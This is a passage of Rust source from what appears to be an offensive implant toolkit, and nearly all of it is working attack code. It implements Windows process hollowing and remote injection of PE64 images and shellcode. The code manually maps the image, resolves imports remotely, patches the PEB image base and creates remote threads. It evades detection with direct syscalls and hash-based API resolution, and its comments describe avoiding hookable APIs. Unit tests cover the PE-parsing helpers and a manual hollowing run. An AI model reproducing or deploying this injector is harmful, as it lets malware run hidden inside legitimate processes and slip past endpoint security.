                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: e_lfanew ({nt_off:#x}) out of bounds for payload of {} bytes",
                    payload.len()
                ));
            }
            if (*nt).Signature != IMAGE_NT_SIGNATURE {
                close_h!(hprocess);
                return Err(anyhow!("inject_into_process: invalid NT signature"));
            }
            // Only PE64 (Magic = 0x020B) is supported.
            let opt_magic = (*nt).OptionalHeader.Magic;
            if opt_magic != winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: only PE64 payloads are supported (found Magic=0x{:x})",
                    opt_magic
                ));
            }

            let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
            let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
            let ep_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;

            // 4.1: Verify the PE can be relocated if we cannot map at its preferred
            // base.  A PE without a relocation directory (.reloc section / reloc
            // DataDirectory) that is loaded at a different address will have all
            // absolute addresses broken — refuse to inject rather than inject
            // silently broken code.
            let reloc_dir = (*nt).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
            let has_relocs = reloc_dir.VirtualAddress != 0 && reloc_dir.Size != 0;

            let remote_mem = VirtualAllocEx(
                hprocess,
                preferred_base as _,
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            let remote_mem = if remote_mem.is_null() {
                if !has_relocs {
                    // Cannot load at preferred base and there is no reloc table.
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process(pid={}): PE has no relocation directory and preferred \
                         base 0x{:x} is not available; cannot load at an alternative address",
                        pid, preferred_base
                    ));
                }
                VirtualAllocEx(
                    hprocess,
                    null_mut(),
                    image_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                )
            } else {
                remote_mem
            };

            if remote_mem.is_null() {
                close_h!(hprocess);
                return Err(anyhow!("VirtualAllocEx(pid={}) failed", pid));
            }

            let remote_base = remote_mem as usize;
            let mut written: SIZE_T = 0;
            WriteProcessMemory(
                hprocess,
                remote_mem,
                payload.as_ptr() as _,
                (*nt).OptionalHeader.SizeOfHeaders as usize,
                &mut written,
            );

            let num_sections = (*nt).FileHeader.NumberOfSections as usize;
            let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
                as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
            for i in 0..num_sections {
                let sec = &*first_section.add(i);
                let raw_off = sec.PointerToRawData as usize;
                let raw_sz = sec.SizeOfRawData as usize;
                let virt_sz = *sec.Misc.VirtualSize() as usize;
                let copy_sz = raw_sz.min(virt_sz);
                if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                    continue;
                }
                let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
                WriteProcessMemory(
                    hprocess,
                    dst,
                    payload.as_ptr().add(raw_off) as _,
                    copy_sz,
                    &mut written,
                );
            }

            let delta = remote_base as isize - preferred_base as isize;
            if delta != 0 {
                apply_relocations_remote(hprocess, remote_base, nt, payload, delta)?;
            }

            // Resolve IAT while memory is still writable (2.2)
            fix_iat_remote(hprocess, remote_base, nt, payload, &mut written)?;

            // Mirror hollow-and-execute behavior: update PEB.ImageBaseAddress
            // before starting remote execution.
            if let Some(nt_query) = nt_query_information_process {
                let mut pbi: ProcessBasicInformation = std::mem::zeroed();
                let mut return_len: u32 = 0;
                let status = nt_query(
                    hprocess,
                    0, // ProcessBasicInformation
                    &mut pbi as *mut _ as *mut c_void,
                    std::mem::size_of::<ProcessBasicInformation>() as u32,
                    &mut return_len as *mut u32,
                );

                if status >= 0 && !pbi.peb_base_address.is_null() {
                    WriteProcessMemory(
                        hprocess,
                        (pbi.peb_base_address as *const u8).add(0x10) as _,
                        &remote_base as *const _ as _,
                        std::mem::size_of::<usize>(),
                        &mut written,
                    );
                } else {
                    tracing::warn!(
                        "inject_into_process: NtQueryInformationProcess failed ({:x}); skipping PEB image-base update",
                        status
                    );
                }
            } else {
                tracing::warn!(
                    "inject_into_process: NtQueryInformationProcess not resolved; skipping PEB image-base update"
                );
            }

            // Apply per-section protections after writing (2.4)
            apply_section_protections(hprocess, remote_base, nt);

            // Flush the instruction cache for the entire mapped image so the
            // CPU sees the newly-written code (L-04 fix).
            FlushInstructionCache(hprocess, remote_mem as *mut c_void, image_size);
            let entry = (remote_base + ep_rva) as *mut c_void;
            let mut h_thread: *mut c_void = null_mut();
            let status = nt_create_thread(
                &mut h_thread,
                0x1FFFFF,
                null_mut(),
                hprocess,
                entry,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );
            if status < 0 || h_thread.is_null() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtCreateThreadEx(pid={}) failed: {:x}",
                    pid,
                    status
                ));
            }
            close_h!(h_thread);
        } else {
            // Shellcode injection — allocate RW, write, protect RX, then thread
            let remote_mem = VirtualAllocEx(
                hprocess,
                null_mut(),
                payload.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if remote_mem.is_null() {
                close_h!(hprocess);
                return Err(anyhow!("VirtualAllocEx(shellcode, pid={}) failed", pid));
            }
            let mut written: SIZE_T = 0;
            WriteProcessMemory(
                hprocess,
                remote_mem,
                payload.as_ptr() as _,
                payload.len(),
                &mut written,
            );
            let mut old_prot = 0u32;
            VirtualProtectEx(
                hprocess,
                remote_mem,
                payload.len(),
                PAGE_EXECUTE_READ,
                &mut old_prot,
            );
            // Flush I-cache before redirecting execution into the newly-written
            // shellcode (L-04 fix).
            FlushInstructionCache(hprocess, remote_mem, payload.len());
            let mut h_sc_thread: *mut c_void = null_mut();
            let sc_status = nt_create_thread(
                &mut h_sc_thread,
                0x1FFFFF,
                null_mut(),
                hprocess,
                remote_mem,
                null_mut(),
                0,
                0,
                0,
                0,
                null_mut(),
            );
            if sc_status < 0 || h_sc_thread.is_null() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtCreateThreadEx(shellcode, pid={}) failed: {:x}",
                    pid,
                    sc_status
                ));
            }
            close_h!(h_sc_thread);
        }

        close_h!(hprocess);
    }
    Ok(())
}

/// Resolve each imported function in the payload's IAT and write addresses into
/// the remote process (2.2).  DLL addresses are resolved in the injector's own
/// address space — valid because system DLLs share ASLR offsets session-wide.
#[cfg(windows)]
unsafe fn fix_iat_remote(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
    payload: &[u8],
    written: &mut usize,
) -> Result<()> {
    use winapi::um::winnt::{CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};

    // Resolve LdrLoadDll address for the remote-DLL-load path.
    let ntdll_base =
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")).unwrap_or(0);
    let ldr_load_dll_addr = if ntdll_base != 0 {
        pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"LdrLoadDll\0"))
    } else {
        None
    };

    let import_dir = &(*nt).OptionalHeader.DataDirectory
        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.VirtualAddress == 0 {
        return Ok(());
    }

    // Convert import-directory RVA to file offset.  Each field in the import
    // descriptor (OriginalFirstThunk, Name, FirstThunk) is also an RVA and
    // must be converted before using it as a payload index.
    let mut desc_off = rva_to_file_offset(import_dir.VirtualAddress as usize, nt);
    loop {
        if desc_off + 20 > payload.len() {
            break;
        }
        let orig_first_thunk_rva =
            u32::from_le_bytes(payload[desc_off..desc_off + 4].try_into().unwrap()) as usize;
        let name_rva =
            u32::from_le_bytes(payload[desc_off + 12..desc_off + 16].try_into().unwrap()) as usize;
        let first_thunk_rva =
            u32::from_le_bytes(payload[desc_off + 16..desc_off + 20].try_into().unwrap()) as usize;
        if name_rva == 0 {
            break;
        }

        // Convert all three RVAs to file offsets.
        let name_off = rva_to_file_offset(name_rva, nt);
        let first_thunk_off = rva_to_file_offset(first_thunk_rva, nt);
        let thunk_rva_off = if orig_first_thunk_rva != 0 {
            rva_to_file_offset(orig_first_thunk_rva, nt)
        } else {
            first_thunk_off
        };

        if name_off >= payload.len() {
            desc_off += 20;
            continue;
        }

        let dll_name_bytes = &payload[name_off..];
        let null_pos = dll_name_bytes
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(dll_name_bytes.len());
        let dll_name_str = match std::str::from_utf8(&dll_name_bytes[..null_pos]) {
            Ok(s) => s,
            Err(_) => {
                desc_off += 20;
                continue;
            }
        };
        let dll_name_lower = format!("{}\0", dll_name_str.to_ascii_lowercase());

        // Find/load the DLL in our process
        let hash = pe_resolve::hash_str(dll_name_lower.as_bytes());
        let local_existing = pe_resolve::get_module_handle_by_hash(hash);
        let dll_base = if let Some(b) = local_existing {
            b
        } else {
            // DLL was not already in our address space.  Load it into the
            // *target* process first so that:
            //   L-02: DLL_PROCESS_ATTACH fires in the target
            //   L-01: session-wide ASLR ensures both processes map the DLL at
            //         the same preferred base, so addresses we resolve locally
            //         remain valid remotely.
            if let Some(ldr_addr) = ldr_load_dll_addr {
                let wide_name: Vec<u16> = dll_name_str
                    .encode_utf16()
                    .chain(std::iter::once(0))
                    .collect();
                let wide_bytes = wide_name.len() * 2;
                let us_offset = wide_bytes;
                let base_addr_offset = us_offset
                    + std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>();
                let total_remote = base_addr_offset + std::mem::size_of::<usize>();

                let mut rb: *mut c_void = std::ptr::null_mut();
                let mut rb_sz = total_remote;
                let alloc_s = nt_syscall::syscall!(
                    "NtAllocateVirtualMemory",
                    hprocess as u64, &mut rb as *mut _ as u64,
                    0u64, &mut rb_sz as *mut _ as u64,
                    (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
                ).unwrap_or(-1);
                let remote_block = if alloc_s >= 0 { rb } else { std::ptr::null_mut() };
                if !remote_block.is_null() {
                    let mut wr = 0usize;
                    let ws = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64, remote_block as u64,
                        wide_name.as_ptr() as u64, wide_bytes as u64,
                        &mut wr as *mut _ as u64,
                    ).unwrap_or(-1);
                    if ws >= 0 {
                        let remote_us_ptr =
                            (remote_block as usize + us_offset) as *mut c_void;
                        let remote_base_out =
                            (remote_block as usize + base_addr_offset) as *mut c_void;
                        let remote_str_va = remote_block as usize;

                        let mut remote_us = winapi::shared::ntdef::UNICODE_STRING {
                            Length: (wide_bytes.saturating_sub(2)) as u16,
                            MaximumLength: wide_bytes as u16,
                            Buffer: remote_str_va as *mut u16,
                        };

                        let us_ws = nt_syscall::syscall!(
                            "NtWriteVirtualMemory",
                            hprocess as u64, remote_us_ptr as u64,
                            &mut remote_us as *mut _ as u64,
                            std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>() as u64,
                            &mut wr as *mut _ as u64,
                        ).unwrap_or(-1);
                        if us_ws >= 0 {
                            let zero_base: usize = 0;
                            let base_ws = nt_syscall::syscall!(
                                "NtWriteVirtualMemory",
                                hprocess as u64, remote_base_out as u64,
                                &zero_base as *const _ as u64,
                                std::mem::size_of::<usize>() as u64,
                                &mut wr as *mut _ as u64,
                            ).unwrap_or(-1);
                            if base_ws >= 0 {
                                let mut h_thread: *mut c_void = std::ptr::null_mut();
                                let status = nt_syscall::syscall!(
                                    "NtCreateThreadEx",
                                    &mut h_thread as *mut _ as u64,
                                    NT_THREAD_ALL_ACCESS as u64,
                                    0u64,
                                    hprocess as u64,
                                    ldr_addr as u64,
                                    remote_us_ptr as u64,
                                    NT_THREAD_SUSPENDED as u64,
                                    0u64, 0u64, 0u64, 0u64,
                                ).unwrap_or(-1);
                                if status >= 0 && !h_thread.is_null() {
                                    #[cfg(target_arch = "x86_64")]
                                    {
                                        let mut ctx: CONTEXT = std::mem::zeroed();
                                        ctx.ContextFlags = CONTEXT_FULL;
                                        if nt_syscall::syscall!(
                                            "NtGetContextThread",
                                            h_thread as u64, &mut ctx as *mut _ as u64,
                                        ).unwrap_or(-1) < 0 {
                                            tracing::warn!(
                                                "fix_iat_remote: NtGetContextThread before LdrLoadDll failed"
                                            );
                                        } else {
                                            // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle)
                                            ctx.Rcx = 0;
                                            ctx.Rdx = 0;
                                            ctx.R8 = remote_us_ptr as u64;
                                            ctx.R9 = remote_base_out as u64;
                                            if nt_syscall::syscall!(
                                                "NtSetContextThread",
                                                h_thread as u64, &ctx as *const _ as u64,
                                            ).unwrap_or(-1) < 0 {
                                                tracing::warn!(
                                                    "fix_iat_remote: NtSetContextThread for LdrLoadDll failed"
                                                );
                                            }
                                        }
                                    }

                                    #[cfg(not(target_arch = "x86_64"))]
                                    {
                                        tracing::warn!(
                                            "fix_iat_remote: remote LdrLoadDll argument setup only implemented on x86_64"
                                        );
                                    }

                                    let _ = nt_syscall::syscall!(
                                        "NtResumeThread", h_thread as u64, 0u64,
                                    );
                                    // Wait with no timeout (null = infinite).
                                    let _ = nt_syscall::syscall!(
                                        "NtWaitForSingleObject", h_thread as u64,
                                        0u64, 0u64,
                                    );

                                    let mut loaded_remote_base: usize = 0;
                                    let mut rd = 0usize;
                                    let read_s = nt_syscall::syscall!(
                                        "NtReadVirtualMemory",
                                        hprocess as u64, remote_base_out as u64,
                                        &mut loaded_remote_base as *mut _ as u64,
                                        std::mem::size_of::<usize>() as u64,
                                        &mut rd as *mut _ as u64,
                                    ).unwrap_or(-1);
                                    if read_s < 0 || rd != std::mem::size_of::<usize>() {
                                        tracing::warn!(
                                            "fix_iat_remote: could not read remote LdrLoadDll base output for {}",
                                            dll_name_str
                                        );
                                    } else if loaded_remote_base == 0 {
                                        tracing::warn!(
                                            "fix_iat_remote: remote LdrLoadDll did not report a loaded base for {}",
                                            dll_name_str
                                        );
                                    }

                                    pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
                                } else {
                                    tracing::warn!(
                                        "fix_iat_remote: NtCreateThreadEx for remote LdrLoadDll failed: {:#010x}",
                                        status as u32
                                    );
                                }
                            }
                        }
                    }
                    let mut rb2 = remote_block;
                    let mut rb2_sz: usize = 0; // MEM_RELEASE ignores size
                    let _ = nt_syscall::syscall!(
                        "NtFreeVirtualMemory",
                        hprocess as u64, &mut rb2 as *mut _ as u64,
                        &mut rb2_sz as *mut _ as u64, NT_MEM_RELEASE as u64,
                    );
                }
            } else {
                tracing::warn!(
                    "fix_iat_remote: NtCreateThreadEx or LdrLoadDll unavailable; skipping remote DLL load for {}",
                    dll_name_str
                );
            }
            // Now load locally — use LdrLoadDll resolved via PEB walk (M-26)
            // instead of the hookable LoadLibraryA IAT entry.
            let hmod = ldr_load_local(dll_name_str);
            hmod
        };

        if dll_base == 0 {
            tracing::warn!("fix_iat_remote: could not find/load {}", dll_name_str);
            desc_off += 20;
            continue;
        }

        let mut thunk_off = thunk_rva_off; // file offset into INT (import name table)
        // Track the IAT position as an RVA, not a file offset.  The remote process
        // maps PE sections at their virtual addresses (RVAs relative to image base),
        // so writes to the remote IAT must target `remote_base + IAT_RVA`, NOT
        // `remote_base + file_offset`.  The two values differ whenever the .idata
        // section has `PointerToRawData != VirtualAddress` (the common case for any
        // PE with a non-trivial section layout).
        let mut iat_rva = first_thunk_rva; // RVA for remote IAT write targets
        loop {
            if thunk_off + 8 > payload.len() {
                break;
            }
            let thunk_val =
                u64::from_le_bytes(payload[thunk_off..thunk_off + 8].try_into().unwrap());
            if thunk_val == 0 {
                break;
            }

            let func_addr: usize = if thunk_val & (1u64 << 63) != 0 {
                // Ordinal import: M-26 — resolve via clean export-table walk.
                let ord = (thunk_val & 0xFFFF) as u32;
                let ep = local_get_export_addr_by_ordinal(dll_base, ord);
                if ep.is_null() {
                    tracing::warn!(
                        "fix_iat_remote: ordinal {} in {} unresolved (refusing GetProcAddress fallback)",
                        ord, dll_name_str
                    );
                    0
                } else {
                    ep as usize
                }
            } else {
                // Named import: thunk_val is an RVA to IMAGE_IMPORT_BY_NAME
                let ibn_rva = (thunk_val & 0x7FFF_FFFF) as usize;
                let ibn_off = rva_to_file_offset(ibn_rva, nt);
                if ibn_off + 2 >= payload.len() {
                    thunk_off += 8;
                    iat_rva += 8;
                    continue;
                }
                let name_start = ibn_off + 2; // skip 2-byte Hint
                let name_bytes = &payload[name_start..];
                let nlen = name_bytes
                    .iter()
                    .position(|&b| b == 0)
                    .unwrap_or(name_bytes.len());
                let mut name_null = name_bytes[..nlen].to_vec();
                name_null.push(0);
                let hash = pe_resolve::hash_str(&name_null);
                match pe_resolve::get_proc_address_by_hash(dll_base, hash) {
                    Some(addr) => addr,
                    None => {
                        tracing::warn!(
                            "fix_iat_remote: {}!{} unresolved via PEB walk, leaving IAT slot empty (M-26)",
                            dll_name_str,
                            String::from_utf8_lossy(
                                &name_null[..name_null.len().saturating_sub(1)]
                            )
                        );
                        0
                    }
                }
            };

            if func_addr != 0 {
                // Write the resolved address into the remote IAT entry.  Use the
                // RVA (not the file offset) to compute the remote target address.
                let iat_remote = (remote_base + iat_rva) as *mut c_void;
                let _ = nt_syscall::syscall!(
                    "NtWriteVirtualMemory",
                    hprocess as u64, iat_remote as u64,
                    &func_addr as *const _ as u64, 8u64,
                    written as *mut _ as u64,
                );
            }
            thunk_off += 8;
            iat_rva += 8;
        }
        desc_off += 20;
    }
    Ok(())
}

/// Apply per-section memory protections after the payload has been written (2.4).
/// Sections with the execute flag get PAGE_EXECUTE_READ; writable-only get
/// PAGE_READWRITE; everything else gets PAGE_READONLY.
#[cfg(windows)]
unsafe fn apply_section_protections(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
) {
    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};

    const SCN_EXEC: u32 = 0x2000_0000;
    const SCN_WRITE: u32 = 0x8000_0000;

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let chars = sec.Characteristics;
        let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
            (true, true)   => PAGE_EXECUTE_READ, // downgrade W+X
            (true, false)  => PAGE_EXECUTE_READ,
            (false, true)  => PAGE_READWRITE,
            (false, false) => PAGE_READONLY,
        };
        let virt_size = (*sec.Misc.VirtualSize() as usize).max(sec.SizeOfRawData as usize);
        if virt_size == 0 { continue; }
        let mut addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
        let mut sz = virt_size;
        let mut old = 0u32;
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            hprocess as u64, &mut addr as *mut _ as u64,
            &mut sz as *mut _ as u64, protect as u64,
            &mut old as *mut _ as u64,
        );
    }
}

#[cfg(not(windows))]
pub fn hollow_and_execute(_payload: &[u8]) -> Result<()> {
    Err(anyhow!("hollow_and_execute is only available on Windows"))
}

#[cfg(not(windows))]
pub fn inject_into_process(_pid: u32, _payload: &[u8]) -> Result<()> {
    Err(anyhow!("inject_into_process is only available on Windows"))
}

// ──────────────────────────────────────────────────────────────────────────────
// Unit tests
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::{rva_to_file_offset_sections, SectionDesc};

    /// Build a synthetic section table where raw offsets and virtual addresses
    /// deliberately differ so a naive RVA-as-file-offset would be wrong.
    ///
    /// Layout:
    ///  .text  VA=0x1000  VS=0x200  raw=0x400   (raw ≠ VA)
    ///  .data  VA=0x2000  VS=0x100  raw=0x600   (raw ≠ VA)
    ///  .idata VA=0x3000  VS=0x080  raw=0x700   (IAT section)
    fn synthetic_sections() -> Vec<SectionDesc> {
        vec![
            SectionDesc { virtual_address: 0x1000, virtual_size: 0x200, raw_offset: 0x400 },
            SectionDesc { virtual_address: 0x2000, virtual_size: 0x100, raw_offset: 0x600 },
            SectionDesc { virtual_address: 0x3000, virtual_size: 0x080, raw_offset: 0x700 },
        ]
    }

    #[test]
    fn rva_in_text_section_maps_to_correct_raw_offset() {
        let secs = synthetic_sections();
        // RVA 0x1050 is 0x50 bytes into .text (VA=0x1000, raw=0x400).
        // Expected file offset: 0x400 + 0x50 = 0x450.
        assert_eq!(rva_to_file_offset_sections(0x1050, &secs), 0x450);
    }

    #[test]
    fn rva_in_idata_section_maps_to_iat_raw_offset() {
        let secs = synthetic_sections();
        // RVA 0x3010 is 0x10 bytes into .idata (VA=0x3000, raw=0x700).
        // Expected: 0x700 + 0x10 = 0x710.
        // A naive RVA-as-file-offset would give 0x3010 — wrong.
        assert_eq!(rva_to_file_offset_sections(0x3010, &secs), 0x710);
    }

    #[test]
    fn rva_in_header_area_falls_back_to_identity() {
        let secs = synthetic_sections();
        // RVA below first section VA is in the PE header; maps 1:1.
        assert_eq!(rva_to_file_offset_sections(0x100, &secs), 0x100);
    }

    #[test]
    fn rva_exactly_at_section_start() {
        let secs = synthetic_sections();
        // RVA 0x2000 is exactly the start of .data (raw=0x600).
        assert_eq!(rva_to_file_offset_sections(0x2000, &secs), 0x600);
    }

    #[test]
    fn rva_one_past_section_end_falls_back() {
        let secs = synthetic_sections();
        // RVA 0x2100 is exactly one byte past .data (VA=0x2000, VS=0x100),
        // so it should fall through to the identity fallback.
        assert_eq!(rva_to_file_offset_sections(0x2100, &secs), 0x2100);
    }

    #[cfg(windows)]
    #[test]
    #[ignore] // Manual Windows test: requires an explicit 32-bit payload path.
    fn hollow_and_execute_pe32_payload_succeeds() {
        use winapi::um::winnt::{
            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER, IMAGE_NT_OPTIONAL_HDR32_MAGIC,
            IMAGE_NT_SIGNATURE,
        };

        let payload_path = std::env::var("HOLLOWING_PE32_PAYLOAD")
            .expect("set HOLLOWING_PE32_PAYLOAD to a valid 32-bit PE payload path");
        let payload = std::fs::read(&payload_path)
            .unwrap_or_else(|e| panic!("failed to read HOLLOWING_PE32_PAYLOAD={payload_path}: {e}"));

        assert!(payload.len() >= 0x40, "PE32 payload too small");
        let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
        unsafe {
            assert_eq!((*dos).e_magic, IMAGE_DOS_SIGNATURE, "invalid DOS signature");
            let e_lfanew = (*dos).e_lfanew as usize;
            let sig_off = e_lfanew;
            assert!(sig_off + 4 <= payload.len(), "missing NT signature");
            let sig = u32::from_le_bytes(payload[sig_off..sig_off + 4].try_into().unwrap());
            assert_eq!(sig, IMAGE_NT_SIGNATURE, "invalid NT signature");

            let magic_off = e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>();
            assert!(magic_off + 2 <= payload.len(), "missing OptionalHeader.Magic");
            let magic = u16::from_le_bytes(payload[magic_off..magic_off + 2].try_into().unwrap());
            assert_eq!(
                magic,
                IMAGE_NT_OPTIONAL_HDR32_MAGIC,
                "payload is not PE32 (OptionalHeader.Magic={magic:#x})"
            );
        }

        super::hollow_and_execute(&payload).expect("PE32 hollowing succeeded");
    }

    #[test]
    fn non_windows_hollow_and_execute_returns_error() {
        #[cfg(not(windows))]
        {
            let result = super::hollow_and_execute(&[0x4d, 0x5a]);
            assert!(result.is_err());
            assert!(result.unwrap_err().to_string().contains("Windows"));
        }
    }
}
